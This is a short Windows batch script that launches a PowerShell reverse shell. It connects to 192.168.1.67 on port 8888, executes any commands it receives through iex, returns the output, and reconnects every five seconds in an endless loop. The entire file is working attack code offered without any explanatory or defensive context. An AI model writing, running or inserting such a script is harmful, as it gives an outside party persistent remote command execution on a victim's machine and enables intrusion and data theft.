@echo off
set server_ip=192.168.1.67
set server_port=8888

:loop
REM Establish a connection to the server and receive commands
powershell -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient('%server_ip%', %server_port%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 | ForEach-Object {0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
timeout /t 5
goto loop
